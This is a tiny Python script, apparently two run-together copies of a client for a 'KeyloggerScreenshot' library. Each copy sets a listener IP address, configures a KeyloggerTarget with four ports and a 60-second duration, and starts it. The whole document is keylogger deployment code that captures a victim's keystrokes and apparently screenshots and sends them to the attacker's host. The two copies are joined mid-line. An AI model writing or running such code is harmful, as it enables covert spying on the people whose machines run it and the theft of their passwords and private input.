import KeyloggerScreenshot as ks

ip = '192.168.0.75'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2233, ip, 3333, ip, 4444, duration_in_seconds=60, phishing_web=None)
key_client.start()import KeyloggerScreenshot as ks 

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 4187, ip, 8793, ip, 3528, ip, 7934, duration_in_seconds=60, phishing_web=None) 
key_client.start()